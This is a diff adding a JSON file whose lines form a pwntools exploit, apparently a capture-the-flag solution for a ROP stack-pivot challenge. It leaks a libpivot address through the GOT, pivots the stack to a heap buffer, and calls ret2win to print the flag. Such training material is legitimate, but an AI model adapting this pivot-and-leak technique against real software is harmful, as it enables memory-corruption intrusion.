@@ -1,0 +1,29 @@
+```json
+{
+  "body_lines": [
+    "libpivot = ELF(str(runtime_dir / 'libpivot.so'), checksec=False)",
+    "p = process([str(binary_path)])",
+    "rop = ROP(elf)",
+    "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
+    "pop_rax = 0x4009bb",
+    "xchg_rsp_rax = 0x4009bd",
+    "p.recvuntil(b'pivot: 0x')",
+    "heap_addr = int(p.recvline().strip(), 16)",
+    "chain1 = flat([pop_rdi, elf.got['foothold_function'], elf.plt['puts'], elf.symbols['pwnme']])",
+    "p.sendafter(b'Send a ROP chain now and it will land there\\n> ', chain1)",
+    "pivot_offset = 0x28",
+    "pivot_payload = b'A' * pivot_offset + flat([pop_rax, heap_addr, xchg_rsp_rax])",
+    "p.sendafter(b'Now please send your stack smash\\n> ', pivot_payload)",
+    "p.recvuntil(b'Thank you!\\n')",
+    "leaked_foothold_raw = p.recvline().strip()",
+    "leaked_foothold_addr = u64(leaked_foothold_raw.ljust(8, b'\\x00'))",
+    "libpivot_base = leaked_foothold_addr - libpivot.symbols['foothold_function']",
+    "ret2win_addr = libpivot_base + libpivot.symbols['ret2win']",
+    "chain2 = flat([ret2win_addr])",
+    "p.sendafter(b'Send a ROP chain now and it will land there\\n> ', chain2)",
+    "p.sendafter(b'Now please send your stack smash\\n> ', pivot_payload)",
+    "flag = p.recvall()",
+    "log.info('Flag: %s' % flag.decode().strip())"
+  ]
+}
+```
